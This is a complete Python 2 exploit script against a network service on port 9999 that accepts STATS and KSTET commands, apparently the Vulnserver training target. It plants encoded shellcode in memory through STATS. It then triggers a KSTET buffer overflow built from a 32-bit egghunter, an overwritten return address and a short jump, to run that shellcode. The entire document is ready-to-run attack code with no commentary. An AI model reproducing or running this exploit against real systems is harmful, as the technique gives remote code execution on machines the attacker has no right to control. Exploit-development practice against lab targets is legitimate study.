#!/usr/bin/python
import socket
import os
import sys
from pwn import *

host = "192.168.1.10"
port = 9999

egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x43\x61\x70\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

payload =  "A"*26
payload += egghunter
payload += "A"*(70-len(payload))
payload += p32(0x625011AF)
payload += "\xEB\xCE" 
payload += "C"*(5000-len(payload))

shellcode =  ""
shellcode += "\xd9\xc5\xd9\x74\x24\xf4\xb8\x1c\x4c\x68\xbb\x5a"
shellcode += "\x33\xc9\xb1\x52\x31\x42\x17\x83\xc2\x04\x03\x5e"
shellcode += "\x5f\x8a\x4e\xa2\xb7\xc8\xb1\x5a\x48\xad\x38\xbf"
shellcode += "\x79\xed\x5f\xb4\x2a\xdd\x14\x98\xc6\x96\x79\x08"
shellcode += "\x5c\xda\x55\x3f\xd5\x51\x80\x0e\xe6\xca\xf0\x11"
shellcode += "\x64\x11\x25\xf1\x55\xda\x38\xf0\x92\x07\xb0\xa0"
shellcode += "\x4b\x43\x67\x54\xff\x19\xb4\xdf\xb3\x8c\xbc\x3c"
shellcode += "\x03\xae\xed\x93\x1f\xe9\x2d\x12\xf3\x81\x67\x0c"
shellcode += "\x10\xaf\x3e\xa7\xe2\x5b\xc1\x61\x3b\xa3\x6e\x4c"
shellcode += "\xf3\x56\x6e\x89\x34\x89\x05\xe3\x46\x34\x1e\x30"
shellcode += "\x34\xe2\xab\xa2\x9e\x61\x0b\x0e\x1e\xa5\xca\xc5"
shellcode += "\x2c\x02\x98\x81\x30\x95\x4d\xba\x4d\x1e\x70\x6c"
shellcode += "\xc4\x64\x57\xa8\x8c\x3f\xf6\xe9\x68\x91\x07\xe9"
shellcode += "\xd2\x4e\xa2\x62\xfe\x9b\xdf\x29\x97\x68\xd2\xd1"
shellcode += "\x67\xe7\x65\xa2\x55\xa8\xdd\x2c\xd6\x21\xf8\xab"
shellcode += "\x19\x18\xbc\x23\xe4\xa3\xbd\x6a\x23\xf7\xed\x04"
shellcode += "\x82\x78\x66\xd4\x2b\xad\x29\x84\x83\x1e\x8a\x74"
shellcode += "\x64\xcf\x62\x9e\x6b\x30\x92\xa1\xa1\x59\x39\x58"
shellcode += "\x22\xa6\x16\x63\xba\x4e\x65\x63\xbe\x5c\xe0\x85"
shellcode += "\xd4\x70\xa5\x1e\x41\xe8\xec\xd4\xf0\xf5\x3a\x91"
shellcode += "\x33\x7d\xc9\x66\xfd\x76\xa4\x74\x6a\x77\xf3\x26"
shellcode += "\x3d\x88\x29\x4e\xa1\x1b\xb6\x8e\xac\x07\x61\xd9"
shellcode += "\xf9\xf6\x78\x8f\x17\xa0\xd2\xad\xe5\x34\x1c\x75"
shellcode += "\x32\x85\xa3\x74\xb7\xb1\x87\x66\x01\x39\x8c\xd2"
shellcode += "\xdd\x6c\x5a\x8c\x9b\xc6\x2c\x66\x72\xb4\xe6\xee"
shellcode += "\x03\xf6\x38\x68\x0c\xd3\xce\x94\xbd\x8a\x96\xab"
shellcode += "\x72\x5b\x1f\xd4\x6e\xfb\xe0\x0f\x2b\x1b\x03\x85"
shellcode += "\x46\xb4\x9a\x4c\xeb\xd9\x1c\xbb\x28\xe4\x9e\x49"
shellcode += "\xd1\x13\xbe\x38\xd4\x58\x78\xd1\xa4\xf1\xed\xd5"
shellcode += "\x1b\xf1\x27"



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending shellcode somewhere in memory via STATS command..."
s.send("STATS " + "CaptCapt" + shellcode)
print s.recv(1024)
s.close()




s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[+] Sending exploit..."
s.send("KSTET " + payload)
print s.recv(1024)
s.close()
